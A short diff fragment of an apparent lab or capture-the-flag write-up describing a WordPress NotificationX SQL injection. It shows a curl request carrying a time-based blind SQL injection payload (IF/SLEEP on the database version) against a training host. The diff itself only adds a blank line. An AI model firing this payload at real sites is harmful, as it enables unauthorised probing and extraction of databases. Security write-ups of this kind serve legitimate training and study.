@@ -177,6 +177,7 @@ To verify the SQL injection, I executed a time-based payload:
 ```bash
 time curl "https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/?rest_route=/notificationx/v1/analytics" \
   -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
+  
 ```
 
 The server responded with a significant delay (approximately 20 seconds), confirming the vulnerability.
